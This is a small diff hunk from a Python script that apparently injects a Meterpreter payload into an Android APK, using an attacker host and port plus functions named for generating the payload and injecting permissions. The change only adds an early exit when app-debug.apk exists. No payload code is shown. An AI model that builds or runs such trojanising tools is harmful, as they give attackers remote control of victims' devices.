@@ -173,6 +173,8 @@ try:
 	args=parser.parse_args()
 	host=args.lhost
 	port=args.lport
+	if os.path.exists("app-debug.apk"):
+		exit()
 	generate_meterpreter(host,port)
 	inyeccion_permisos()
 	integracion_meterpreter()
